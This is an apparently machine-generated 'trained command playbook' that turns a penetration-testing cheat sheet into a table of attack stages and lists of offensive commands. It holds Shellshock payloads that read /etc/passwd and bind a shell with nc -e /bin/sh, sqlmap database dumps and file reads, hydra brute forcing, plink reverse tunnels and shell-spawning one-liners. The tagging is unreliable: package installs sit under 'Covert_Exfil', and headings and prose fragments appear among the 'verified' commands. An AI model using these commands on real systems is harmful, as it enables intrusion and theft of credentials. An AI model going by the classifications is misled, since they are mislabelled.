---
title: "Trained Command Playbook: Penetration Testing Tools Cheat Sheet.html"
tags:
  - active_enum
  - arp
  - covert_exfil
  - credential_access
  - cve-2014-6271
  - enumeration
  - eth0
  - hashcat
  - html
  - http
  - https
  - impacket
  - initial_access_exploitation
  - john
  - lateral_movement_routing_pivot
  - mdp
  - mimikatz
  - netstat
  - nmap
  - passive_enum
  - powershell
  - privilege_escalation
  - trained
source_file: Penetration Testing Tools Cheat Sheet.html
updated: 2026-10-25 01:00:01
---

# Trained Command Playbook: `Penetration Testing Tools Cheat Sheet.html`

- **Source Document:** `~/Projects/CORA/Training/Penetration Testing Tools Cheat Sheet.html`
- **CEGAR Verified Commands:** `148` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `148`
- **Discovered IPs/Subnets:** `0.0.0.0, 10.0.0.0, 10.255.255.255, 127.0.0.0, 127.0.0.1, 127.255.255.255, 128.0.0.0, 172.16.0.0, 172.31.255.255, 191.255.255.255, 192.0.0.0, 172.24.0.0, 172.24.0.1, 172.24.1.0/24, 172.24.1.1, 172.24.1.100, 172.24.1.108, 172.24.1.156, 172.24.1.200, 172.24.11.200, 172.24.2.1, 172.24.255.255, 172.24.99.131, 223.255.255.255, 224.0.0.0, 239.255.255.255, 240.0.0.0, 255.0.0.0, 255.128.0.0, 255.192.0.0, 255.224.0.0, 255.240.0.0, 255.248.0.0, 255.252.0.0, 255.254.0.0, 255.255.0.0, 255.255.128.0, 255.255.192.0, 255.255.224.0, 255.255.240.0, 255.255.248.0, 255.255.252.0, 255.255.254.0, 255.255.255.0, 255.255.255.128, 255.255.255.192, 255.255.255.224, 255.255.255.240, 255.255.255.249, 255.255.255.252, 255.255.255.254, 255.255.255.255, 77.1.2.25`
- **Discovered Interfaces:** `eth0`
- **Related Knowledge Note:** [[knowledge/trained_penetration_testing_tools_cheat_sheet]]

## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `ifconfig` | `s_passive_topology_mapped` | `ifconfig eth0 xxx.xxx.xxx.xxx/24` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `whois` | `s_passive_topology_mapped` | `whois domain-name-here.com` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nc` | `s_active_services_enumerated` | `nc -v 172.24.1.1 25` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.1.1 25` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `nbtscan` | `s_credentials_or_certs_acquired` | `nbtscan 172.24.1.0/24` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `netcat` | `s_initial_shell_or_api_access` | `netcat -nvlp 443` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `plink` | `s_protocol_chain_established` | `plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `git` | `s_active_services_enumerated` | `git clone https://github.com/nccgroup/vlan-hopping.git` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `chmod` | `s_interactive_tty_or_priv_escalated` | `chmod 700 frogger.sh` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `apt-get` | `s_covert_exfil_verified` | `apt-get -y install ruby-dev git make g++` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `nslookup` | `s_passive_topology_mapped` | `nslookup -> set type=any -> ls -d blah.com` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `dig` | `s_passive_topology_mapped` | `dig a domain-name-here.com @nameserver` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nc` | `s_active_services_enumerated` | `nc TARGET-IP 80` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `net` | `s_cross_subnet_pivot_routed` | `net use \\TARGET\IPC$ "" /u:""` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `enum4linux` | `s_credentials_or_certs_acquired` | `enum4linux -a target-ip` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `searchsploit` | `s_initial_shell_or_api_access` | `searchsploit -u` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `ssh` | `s_protocol_chain_established` | `ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `frogger.sh` | `s_active_services_enumerated` | `./frogger.sh` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `gcc` | `s_interactive_tty_or_priv_escalated` | `gcc -o exploit exploit.c` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `gem` | `s_covert_exfil_verified` | `gem install bundler` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `nmap` | `s_passive_topology_mapped` | `nmap -v -sS -A -T4 target` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `dig` | `s_passive_topology_mapped` | `dig mx domain-name-here.com @nameserver` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nmap` | `s_active_services_enumerated` | `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 172.24.1.X` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `nbtscan` | `s_cross_subnet_pivot_routed` | `nbtscan Cheat Sheet` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `smbclient` | `s_credentials_or_certs_acquired` | `smbclient -L //172.24.1.100` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `wget` | `s_initial_shell_or_api_access` | `wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `ssh` | `s_protocol_chain_established` | `ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `udp-protocol-scanner.pl` | `s_active_services_enumerated` | `./udp-protocol-scanner.pl -p ike TARGET(s)` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `gcc` | `s_interactive_tty_or_priv_escalated` | `gcc -m32 exploit.c -o exploit` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `git` | `s_covert_exfil_verified` | `git clone https://github.com/iagox86/dnscat2.git` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `nmap` | `s_passive_topology_mapped` | `nmap -v -sS -p--A -T4 target` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `dig` | `s_passive_topology_mapped` | `dig axfr domain-name-here.com @nameserver` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nmap` | `s_active_services_enumerated` | `nmap -sU TARGET` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `enum4linux` | `s_cross_subnet_pivot_routed` | `enum4linux Cheat Sheet` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `nmap` | `s_credentials_or_certs_acquired` | `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 172.24.1.0/24` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `gcc` | `s_initial_shell_or_api_access` | `gcc -m32 -o output32 hello.c (32 bit)` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `proxychains` | `s_protocol_chain_established` | `proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `udp-protocol-scanner.pl` | `s_active_services_enumerated` | `./udp-protocol-scanner.pl -p ike -f ip.txt` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `gcc` | `s_interactive_tty_or_priv_escalated` | `gcc -o suid suid.c` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `searchsploit` | `s_covert_exfil_verified` | `searchsploit windows 2003 \| grep -i local` |

## Verified Executable Commands (Grouped by Capability Layer)

### General_System (100 commands)
```bash
whois domain-name-here.com
dig a domain-name-here.com @nameserver
dig mx domain-name-here.com @nameserver
dig axfr domain-name-here.com @nameserver
nslookup -> set type=any -> ls -d blah.com
dig axfr blah.com @ns1.blah.com
./SimplyEmail.py -all -e TARGET-DOMAIN
ls /usr/share/nmap/scripts/* | grep ftp
./udp-protocol-scanner.pl -f ip.txt
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
nbtscan 172.24.1.0/24
enum4linux -a target-ip
smbclient -L //172.24.1.100
python /usr/share/doc/python-impacket-doc/examples
net use \\TARGET\IPC$ "" /u:""
smbclient -L //172.24.99.131
apt-get install nbtscan-unixwiz
python Responder.py -i local-ip -I eth0
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
snmpwalk -c public -v1 172.24.1.X 1|  grep hrSWRunName|cut -d* * -f
onesixtyone -c names -i hosts
apt-get install snmp snmp-mibs-downloader
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html
apt-get update
apt-get dist-upgrade -y
apt-get install openvas
apt-get install oscanner
apt-get install tnscmd10g
plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
chmod 700 frogger.sh
./frogger.sh
./udp-protocol-scanner.pl -p ike TARGET(s)
./udp-protocol-scanner.pl -p ike -f ip.txt
pip install pyip
./ikeforce.py TARGET-IP -e -w wordlists/groupnames.dic
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
./udp-protocol-scanner.pl -p ike SUBNET/24
apt-get -y install ruby-dev git make g++
gem install bundler
searchsploit windows 2003 | grep -i local
grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*
searchsploit -u
searchsploit apache 2.2
searchsploit "Linux Kernel"
searchsploit linux 2.6 | grep -i ubuntu | grep local
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
mount 172.24.1.1:/vol/share /mnt/nfs
mount -t cifs -o username=user,password=pass,domain=blah //172.24.1.X/share-name /mnt/cifs
net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
apt-get install smb4k -y
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 172.24.XXX.XXX
snmpwalk public -v1 172.24.X.XXX 1 |grep 77.1.2.25 |cut -d" " -f4
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 172.24.X.XXX
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 172.24.X.XXX ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 172.24.X.XXX pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 172.24.X.XXX smtp -V
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt
john --format=descrypt hash --show
gcc -o exploit exploit.c
gcc -m32 exploit.c -o exploit
gcc -o suid suid.c
gcc -m32 -o suid suid.c
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
perl -e 'exec "/bin/sh";'
show running-config
show ip interface
show ip route
dir all-filesystems
dir /all
Vi Cheat Sheet
nbtscan Cheat Sheet
enum4linux Cheat Sheet
WHOIS enumeration
NBTScan unixwiz
Plink.exe Tunnel
GCC Compile 32Bit Exploit on 64Bit Kali
snmpwalk -c public -v1 172.24.1.X 1| grep hrSWRunName|cut -d* * -f
Find exploits for enumerated hosts / services.
grep -R "W7" /usr/share/metasploit-framework
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
mount -t cifs -o username=user,password=pass
net use Z: \\win-server\share password
snmpwalk public -v1 172.24.X.XXX 1 |grep 77.1.2.25
python /usr/share/doc/python-impacket-doc/examples/
samrdump.py SNMP 172.24.X.XXX
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
john --format=descrypt --wordlist
```

### L2_ARP_Link (1 commands)
```bash
git clone https://github.com/nccgroup/vlan-hopping.git
```

### L3_Routing_NAT (2 commands)
```bash
ifconfig eth0 xxx.xxx.xxx.xxx/24
IP Address Range
```

### L4_Port_Service (25 commands)
```bash
nc -v 172.24.1.1 25
telnet 172.24.1.1 25
nc TARGET-IP 80
nmap -v -sS -A -T4 target
nmap -v -sS -p--A -T4 target
nmap -v -sU -sS -p- -A -T4 target
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 172.24.1.X
nmap -sU TARGET
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 172.24.1.0/24
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 172.24.11.200-254
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
netstat -tulpn
nmap --script=oracle-tns-version
nmap --script=oracle-sid-brute
nmap --script=oracle-brute
nmap -p 1521 -A TARGET
netcat -nvlp 443
nmap -sU --script=ms-sql-info 172.24.1.108 172.24.1.156
ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
nmap -Pn -sV -p 1723 TARGET(S)
nc -l -p 443
nmap -sT -p 161 172.24.X.XXX/254 -oG snmp_results.txt (then grep)
nmap -sT -p 161 172.24.X.XXX/254 -oG snmp_results.txt
```

### L7_HTTP_Web (20 commands)
```bash
git clone https://github.com/killswitch-GUI/SimplyEmail.git
git clone https://github.com/portcullislabs/udp-proto-scanner.git
git clone https://github.com/SpiderLabs/Responder.git
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
git clone https://github.com/SpiderLabs/ikeforce.git
git clone https://github.com/iagox86/dnscat2.git
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
git clone https://github.com/nccgroup/shocker
nikto -h 172.24.1.1
sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
sqlmap -o -u "http://meh.com/form/" --forms
sqlmap -o -u "http://meh/vuln-form" --forms  -D database-name -T users --dump
sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"
sqlmap check form for injection
sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump
sqlmap dump and crack hashes for table users on database-name.
```

